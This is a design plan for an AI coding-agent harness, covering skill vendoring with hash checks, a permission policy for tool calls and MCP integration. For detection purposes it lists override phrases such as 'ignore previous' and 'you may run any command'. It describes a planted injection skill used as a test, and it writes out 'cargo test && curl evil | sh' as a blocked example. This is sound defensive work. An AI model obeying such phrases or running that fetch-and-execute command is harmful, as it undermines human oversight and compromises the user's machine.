# Phase 3 plan

Status: draft · Follows `docs/PRD.md` (the Skills and policy phase) and the phase 0 to 2 plans

## 0. Goal and done-when

Phases 0 to 2 built a loop that survives. Phase 3 makes it safe to hand
work to: every tool call passes a policy the human owns, skills arrive as
vetted, hashed data rather than prompts pasted by hand, and external tools
come in over MCP behind the same policy. The PRD's two conditions are the
spine of the done-when; the rest makes them checkable.

Done when:

1. **`implement` and `tdd` run end to end.** In a real repository, the
   user runs `/implement <a small ticket>`; the model loads `tdd` through
   the `load_skill` tool, writes a failing test, makes it pass, runs the
   suite, and reports. Both skills are the vendored Pocock versions,
   unmodified. On both backends.
2. **No tool call bypasses policy.** Every `tool_result` in the log carries
   the decision that let it run, with the rule that decided it or the
   `permission_decided` event that a human answered. An integration test
   asserts this over every runtime test log, and a review of the loop shows
   one call site for tool execution, behind `policy_check`.
3. **A tampered skill does not load.** Change one byte of a vendored
   `SKILL.md`; the loader refuses with the hash mismatch and the REPL says
   which skill. `aigentic skills check` reports it.
4. **The static check catches a planted injection.** A test skill whose
   body tells the model to ignore project rules, run a `curl | sh`, or
   widen permissions is flagged with the line, and `skills check` exits
   non-zero until a human records acceptance in the lockfile.
5. **An MCP server's tool runs through policy.** A stdio MCP server is
   declared, its tools appear in the registry as `network` class, the REPL
   shows their descriptions at connect time, a call prompts, and the
   result is in the log like any other tool result.

Not in phase 3: project records and per-project allowlists as such
(phase 4; phase 3 uses a proto-project file, see decision 2), per-user
permissions (phase 5), MCP server mode, skill evals (the trigger-rate
harness in the PRD's Maintaining section), `web_fetch` and `web_search`,
the `ratatui` client.

## 1. Layout changes

```
skills/                          vendored skill folders, byte-identical to upstream
  pocock/engineering/tdd/SKILL.md
  pocock/engineering/implement/SKILL.md
  ... (the whole upstream set; see section 3)
skills.lock.toml                 one entry per skill: source, commit, hash, invocation, review
crates/skills/src/
  manifest.rs                    SKILL.md frontmatter and body
  lock.rs                        skills.lock.toml, hash verification
  discover.rs                    resolution order: project, user, bundled
  check.rs                       the static check and its findings
  lib.rs                         SkillSet: enabled skills, descriptions for the prefix, load by name
crates/policy/src/
  rules.rs                       Rule, Decision, the default rule set
  lib.rs                         Policy: decide(call, class) -> Outcome; bash allow patterns
crates/tools/src/
  registry.rs                    ToolRegistry: built-ins, MCP tools, lookup by name, specs
  fs.rs                          list_dir, grep, edit_file (read, read, write)
  mcp.rs                         McpServer: rmcp client over stdio or streamable HTTP
crates/core/src/event.rs         EventKind gains SkillLoaded, PermissionRequested, PermissionDecided
crates/log/src/payload.rs        their payloads; ToolResultPayload gains `policy`
crates/runtime/src/
  harness_tools.rs               load_skill, pin, ask_human: tools the runtime answers itself
  seams.rs                       policy_check gets its body; turn_queue_next stays
  approver.rs                    Approver trait: how a client answers a permission request
crates/tui/src/
  approve.rs                     inline y / n / a prompt
  skills_cmd.rs                  `aigentic skills list | check | vendor | update`
aigentic.toml                    per-repository proto-project file (decision 2)
```

Dependency direction is unchanged: `skills` and `policy` depend on `core`
only; `tools` gains `rmcp`; `runtime` is still the only crate that knows
them all.

## 2. Signatures (no bodies)

```rust
// crates/core/src/event.rs
pub enum EventKind {
    /* phase 0-2 kinds */
    SkillLoaded,           // the body of a skill entered the thread
    PermissionRequested,   // a call needs a human
    PermissionDecided,     // a human answered; author is who answered
}

// crates/core/src/tool.rs — unchanged; RiskClass and Tool as today.

// crates/log/src/payload.rs
pub struct SkillLoadedPayload { pub name: String, pub hash: String, pub source: String, pub body: String, pub invoked_by: Invoker }
pub enum Invoker { User, Model }
pub struct PermissionRequestedPayload { pub call: ToolCall, pub class: RiskClass, pub reason: String }
pub struct PermissionDecidedPayload { pub call_id: String, pub allow: bool, pub scope: DecisionScope }
pub enum DecisionScope { Once, Session }
/// Recorded on every tool result: what let the call run.
pub enum PolicyRecord {
    Rule { rule: String, decision: String },      // "bash allow-pattern cargo test", "class read: allow"
    Human { event: Ulid, allow: bool },            // the permission_decided event
}
pub struct ToolResultPayload { pub result: ToolResult, pub policy: Option<PolicyRecord> } // was a newtype

// crates/skills/src/lib.rs
pub struct Manifest { pub name: String, pub description: String, pub invocation: Invocation, pub body: String,
                      pub path: PathBuf, pub scripts: Vec<PathBuf> }
pub enum Invocation { User, Model }               // `disable-model-invocation: true` => User
pub struct LockEntry { pub name: String, pub path: String, pub source: String, pub commit: String,
                       pub sha256: String, pub invocation: Invocation, pub review: Review }
pub enum Review { Accepted { by: String, on: String }, Pending }
pub struct Lockfile { pub skills: Vec<LockEntry> }
pub struct Finding { pub skill: String, pub line: usize, pub kind: FindingKind, pub text: String }
pub enum FindingKind { ToolReference, Url, ShellInScript, PermissionWidening, IgnoreRules }
pub fn discover(project: &Path, user: &Path, bundled: &Path) -> Result<Vec<Manifest>, SkillError>;
pub fn check(manifest: &Manifest) -> Vec<Finding>;
pub struct SkillSet { /* enabled manifests, verified against the lock */ }
impl SkillSet {
    pub fn load(enabled: &[String], roots: Roots, lock: &Lockfile) -> Result<Self, SkillError>; // hash mismatch => Err
    pub fn descriptions(&self) -> String;         // one line per skill, for the stable prefix
    pub fn user_invoked(&self) -> Vec<&Manifest>; // slash commands
    pub fn model_invoked(&self) -> Vec<&Manifest>;// offered via load_skill
    pub fn get(&self, name: &str) -> Option<&Manifest>;
}
pub enum SkillError { HashMismatch { name, expected, actual }, NotInLock(String), MissingRequirement { skill, tool },
                      Frontmatter { path, message }, Io(..) }

// crates/policy/src/lib.rs
pub enum Decision { Allow, Ask, Deny }
pub struct Rule { pub tool: Option<String>, pub class: Option<RiskClass>, pub decision: Decision, pub reason: String }
pub struct Policy { pub rules: Vec<Rule>, pub bash_allow: Vec<String> /* glob-like prefixes */ }
pub enum Outcome { Allow { rule: String }, Ask { reason: String }, Deny { rule: String } }
impl Policy {
    pub fn defaults() -> Self;                    // section 4
    pub fn decide(&self, call: &ToolCall, class: RiskClass) -> Outcome; // first matching rule wins
}

// crates/tools/src/registry.rs
pub struct ToolRegistry { /* Vec<Box<dyn Tool>> plus MCP-backed tools */ }
impl ToolRegistry {
    pub fn builtin(workdir: Workdir) -> Self;     // read_file, write_file, edit_file, list_dir, grep, bash
    pub async fn connect_mcp(&mut self, server: &McpServerConfig) -> Result<Vec<ToolSpec>, McpError>;
    pub fn specs(&self) -> Vec<ToolSpec>;         // sorted by name
    pub fn get(&self, name: &str) -> Option<&dyn Tool>;
}
pub struct McpServerConfig { pub name: String, pub transport: McpTransport, pub class: RiskClass /* default Network */ }
pub enum McpTransport { Stdio { command: String, args: Vec<String> }, Http { url: String } }
// an MCP tool is registered as `mcp.<server>.<tool>` and implements `Tool` with the server's schema.

// crates/runtime
pub trait Approver: Send {
    /// Blocks the turn until a human answers. Non-interactive clients deny.
    fn ask(&mut self, request: &PermissionRequestedPayload) -> Answer;
}
pub enum Answer { Allow, AllowForSession, Deny }
impl Runtime {
    pub fn with_policy(self, policy: Policy) -> Self;
    pub fn with_skills(self, skills: SkillSet) -> Self;
    pub fn with_approver(self, approver: Box<dyn Approver>) -> Self;
    pub fn with_registry(self, registry: ToolRegistry) -> Self;   // replaces `tools: Vec<Box<dyn Tool>>`
    /// User-invoked skill: appends skill_loaded, then runs a turn whose user message is the args.
    pub async fn invoke_skill(&mut self, author, name: &str, args: &str, observe) -> Result<TurnOutcome, RuntimeError>;
}
// seams.rs: policy_check gets its body and a new shape
pub fn policy_check(&mut self, call: &ToolCall, class: RiskClass, observe) -> Result<Verdict, RuntimeError>;
pub enum Verdict { Run(PolicyRecord), Refuse(PolicyRecord) }
```

Changed phase 0 to 2 signatures: `ToolResultPayload` becomes a struct with
a `policy` field (older lines read back with `None`); `policy_check` takes
the risk class and the observer, returns a `Verdict`, and can append
events; `Runtime::new` takes a `ToolRegistry` instead of a `Vec<Box<dyn
Tool>>`. Everything else is additive.

## 3. Skills

**Vendoring.** The upstream repository is copied under `skills/pocock/`
with its bucket structure (`engineering/`, `productivity/`, `misc/`,
`in-progress/`) and files byte-identical, so a hash of `SKILL.md` and every
script matches what upstream shows. The lockfile records the upstream
commit (`c55ee46` at the time of drafting), the SHA-256 of each file, the
invocation derived from `disable-model-invocation`, and the review state.
The PRD's frontmatter fields that upstream lacks (`version`, `requires`,
`source`) live in the lock, not in the file, so a vendored skill is never
edited. `requires` is filled by the static check's tool references and
confirmed by the reviewer.

**What is enabled.** Nothing by default. `aigentic.toml` in the working
directory lists enabled skills by name. The acceptance enables
`implement`, `tdd`, `code-review`, `diagnosing-bugs` and `grilling`. The
`in-progress` bucket is vendored but nothing in it is enabled.

**Resolution.** Project `./skills/<name>/`, then user
`~/.config/aigentic/skills/<name>/`, then bundled. Closer wins by name.
Project and user skills need a lock entry too (`skills vendor` writes
one), so a local skill is hashed and reviewed like a bundled one.

**In the prefix.** After the pinned facts, one system message lists every
enabled skill as `name: description` under a fixed heading, and says
user-invoked skills are run by the user and model-invoked ones via
`load_skill`. That line is byte-stable between turns.

**Loading.** A user-invoked skill is a slash command: `/implement fix the
off-by-one in cost.rs` appends `skill_loaded` with the body, then a user
message with the arguments, then runs the turn. A model-invoked skill is
the `load_skill` tool: the runtime answers it by appending `skill_loaded`
and returning "loaded" as the tool result; the body is then in context on
the next iteration. The projection renders `skill_loaded` as a user-role
message from `Author::System`: a marker line naming the skill, then the
body. Skills follow upstream's own rule: a model-invoked skill never loads
a user-invoked one, enforced in `load_skill`.

**The static check** runs over `SKILL.md` and scripts and reports, with
line numbers: tool names referenced (`read_file`, `bash`, ...), URLs,
shell scripts and any `curl`, `wget`, `sh -c`, `eval` or pipe-to-shell in
them, and phrases that widen authority or ask to ignore rules (a fixed,
versioned pattern list: "ignore previous", "ignore the project rules",
"you may run any command", "without asking", "disable", "sudo"). Findings
are informational for a human, not a verdict: `skills check` exits
non-zero for any skill whose lock entry is `Pending` and has findings, and
zero once a human sets `review = { by, on }`. The vendored set is reviewed
during step 6 and the findings kept in `docs/skills-review.md`.

**Compaction.** A `skill_loaded` body is part of the thread body and gets
summarised like everything else; the prefix line survives, so the model
can load it again.

## 4. Policy

**Rules** are evaluated first match wins. The defaults, overridable in
`aigentic.toml`:

| Match | Decision | Reason |
| --- | --- | --- |
| class `safe` | allow | harness self-management |
| class `read` | allow | reading the workspace |
| tool `bash`, command matches an allow pattern | allow | the common case must not prompt |
| class `exec` | ask | anything else in a shell |
| class `write` | ask | changes the workspace |
| class `network` | ask | MCP tools and, later, the web |
| tool `mcp.*` | ask | until a human downgrades a server's class |

Default bash allow patterns: `cargo fmt`, `cargo build`, `cargo test`,
`cargo clippy`, `cargo check`, `cargo run`, `git status`, `git diff`,
`git log`, `git show`, `ls`, `pwd`, `cat`, `head`, `tail`, `grep`, `rg`,
`find`, `wc`, `echo`. A pattern matches a command whose first word, or
first two words for `cargo` and `git`, equal the pattern, and that
contains no `|`, `;`, `&&`, `>`, `$(` or backtick. A compound command
always asks.

**Asking.** The runtime appends `permission_requested`, calls the
`Approver`, appends `permission_decided` with the human's author, and then
runs or refuses. `AllowForSession` is remembered in memory for the exact
tool name and, for bash, the exact command; it is still an event each time
it is used (a `permission_decided` with scope `Session` referencing the
first). A refused call gets an error tool result, "denied by policy: ...",
so the model sees it on the next iteration, as the PRD's loop diagram
requires.

**Auditability.** Every `tool_result` carries `policy`: the rule name or
the deciding event. The resume path's synthetic results carry
`Rule { "resume", "synthetic" }`. The audit test walks every log a runtime
test produced and asserts no `tool_result` lacks a record.

**Skill scripts** are run by the model through `bash` and therefore go
through the same rules. There is no bundled-skill exemption; upstream's
`git-guardrails` script asks like any other script.

## 5. Tools and MCP

**Registry.** `ToolRegistry` replaces the plain vector. Built-ins gain
`list_dir` (read), `grep` (read; ripgrep-style over the workdir, capped)
and `edit_file` (write; exact-string replace, refusing on zero or many
matches), which `implement` and `tdd` expect. Harness tools `load_skill`,
`pin` and `ask_human` are answered by the runtime, not the registry, but
appear in the specs with class `safe`. `ask_human` returns the human's
typed answer as the tool result.

**MCP** uses `rmcp` as a client over stdio or streamable HTTP. Servers are
declared in `aigentic.toml`; at startup the REPL connects, prints each
server's tools with their descriptions (untrusted text, shown so the human
sees what the model will see), and registers them as `mcp.<server>.<tool>`
with the server's class (`network` by default; `write` or `read` when the
human sets it). A server that fails to connect is reported and skipped;
the thread still runs. Tool descriptions and schemas go to the model
unchanged.

## 6. Configuration

`aigentic.toml` in the working directory, the seed of phase 4's
`project.toml`:

```toml
[skills]
enabled = ["implement", "tdd", "code-review", "diagnosing-bugs", "grilling"]

[policy]
# rules = [{ class = "write", decision = "allow" }]   # prepended to the defaults
bash_allow = ["cargo", "git status", "git diff", "pnpm test"]   # replaces the defaults

[[mcp_servers]]
name = "docs"
transport = { stdio = { command = "npx", args = ["-y", "@example/docs-mcp"] } }
class = "read"
```

Unknown fields are rejected, as in `config.toml`. The file is optional;
without it no skills are enabled, the default policy applies, and no MCP
servers connect.

CLI: `aigentic skills list` (name, invocation, source, review state, where
it resolved from), `aigentic skills check` (hashes and static check, the
exit code above), `aigentic skills vendor <git-url>@<commit> [--into user]`
(clone at the commit, copy, hash, write lock entries as `Pending`, print
findings), `aigentic skills update` (re-vendor the recorded source at its
current head into a temp dir, show a diff per changed skill, re-run the
check, apply only what the human accepts). Network only in `vendor` and
`update`, never at thread time.

REPL: `/<skill>` for every enabled user-invoked skill; `/skills` lists
them; the permission prompt is inline, `y` once, `a` for the session, `n`
deny, and Ctrl-C denies. Nothing else changes.

## 7. Tests

- **Manifest and lock** (skills): frontmatter parsing including
  `disable-model-invocation`; a lock round trip; hash verification passes
  on the vendored set and fails on a one-byte change; resolution order
  with a project override; `requires` mismatch fails loudly.
- **Static check** (skills): one fixture skill per finding kind, plus the
  planted injection from done-when 4; the real vendored set produces the
  findings recorded in `docs/skills-review.md` and no others (a snapshot,
  so an upstream update that adds a `curl` shows up as a test failure).
- **Policy** (policy): the default table, first-match-wins with a
  prepended rule, every bash allow pattern, and the compound-command rule.
- **Registry and tools** (tools): `edit_file` refuses ambiguous matches;
  `grep` and `list_dir` cap output; MCP against an in-process rmcp test
  server over stdio: connect, list, call, class default.
- **Runtime**: `load_skill` appends `skill_loaded` and the body is in the
  next request; a model-invoked skill cannot load a user-invoked one; a
  scripted approver answering allow, session and deny, with the exact
  events; the audit test over every log the runtime tests produce; the
  phase 0 to 2 tests unchanged apart from the three signatures.
- **REPL**: slash dispatch for a dynamic skill list; prompt parsing.

No test touches the network. The rmcp test server runs in-process.

## 8. Steps, one commit each

1. `core, log: skill_loaded, permission_requested and permission_decided`
   with payloads; `ToolResultPayload` gains `policy`; projection renders
   `skill_loaded`.
2. `skills: manifest, lock, discovery and static check` with fixtures.
3. `skills: vendor the pocock set` — the files, `skills.lock.toml` with
   every entry `Pending`, and `docs/skills-review.md` from `skills check`.
4. `policy: rules and defaults`.
5. `tools: registry, list_dir, grep, edit_file`.
6. `tools: mcp client` with the in-process test server.
7. `runtime: policy in the loop` — the seam gets its body, the approver,
   the audit test, harness tools including `pin` moved from the REPL path
   to a tool.
8. `runtime: skills in the loop` — prefix line, `load_skill`,
   `invoke_skill`.
9. `tui: aigentic.toml, permission prompt, skill commands, skills CLI`.
10. Review: a human reads `docs/skills-review.md`, sets each enabled skill
    to `Accepted`, commits `skills: review the enabled set`.
11. Acceptance: done-when 1 on both backends in this repository with a
    real small ticket, done-when 3 and 4 by hand, done-when 5 against a
    public stdio MCP server. Record in the READMEs.

Each step passes `cargo fmt`, `cargo clippy --all-targets -- -D warnings`
and `cargo test` before its commit.

## 9. Decisions

1. **Vendored files are byte-identical to upstream; our metadata lives in
   the lock.** Hashes then verify against upstream directly, `update` is
   a plain diff, and a project override is a different path, never an
   edit. The PRD's extra frontmatter fields are lock fields.
2. **`aigentic.toml` is the proto-project file.** The PRD says skills are
   enabled per project and never globally; projects arrive in phase 4.
   A per-repository file with `[skills]`, `[policy]` and `[[mcp_servers]]`
   gives that scoping now and becomes `project.toml` later by renaming and
   adding fields, so nothing here is thrown away.
3. **Rule decisions are recorded on the tool result; human decisions are
   events.** Two events per auto-allowed call would double the log for the
   common case. The audit needs a record per result, and it has one either
   way. A human's answer is an event because the PRD wants attributed
   approvals from day one.
4. **`AllowForSession` never persists.** Standing rules belong in
   `aigentic.toml`, edited by a human. A session grant dies with the
   process, and each use is still an event.
5. **The approver blocks the turn.** The PRD's state machine has
   `AwaitingApproval`; in phase 3 that is a synchronous call into the
   client. Phase 5 replaces it with an event any approver can answer;
   the events are already the right shape.
6. **Compound shell commands always ask.** An allow pattern on `cargo`
   must not let `cargo test && curl evil | sh` through. The check is
   syntactic and conservative; the cost is an occasional prompt for a
   harmless pipe.
7. **MCP tools default to `network`** and ask, per the PRD, until a human
   sets the server's class. Descriptions are shown at connect time and
   sent to the model unchanged; rewriting them would hide what the model
   sees.
8. **Findings are for humans, not verdicts.** The static check cannot
   judge intent; it makes the reviewer's job fast and the acceptance
   explicit. A `Pending` skill with findings blocks `skills check`, not
   the loader; the loader blocks only on hash and lock mismatches, so a
   reviewed skill keeps working when the pattern list grows.
9. **Harness tools are answered by the runtime.** `load_skill` and `pin`
   need the log; the tools crate must not know it. They appear in the
   specs like any tool so the model's view is uniform.
10. **Skill evals wait.** The PRD's trigger-rate harness needs recorded
    threads where a skill should and should not fire; those accumulate
    from daily use in phase 4.

## 10. Open items

- Whether `edit_file` should accept a small unified diff instead of exact
  strings. Exact strings match what the Pocock skills assume of Claude
  Code's editor; start there.
- Streamable HTTP MCP servers need auth headers eventually; phase 3 does
  stdio and unauthenticated HTTP only.
- The pattern list for the static check will grow; it is versioned, and
  `docs/skills-review.md` records which version reviewed each skill.
- `ask_human` in a non-interactive run (piped stdin) returns "no human
  available"; the model should treat it as a deny.
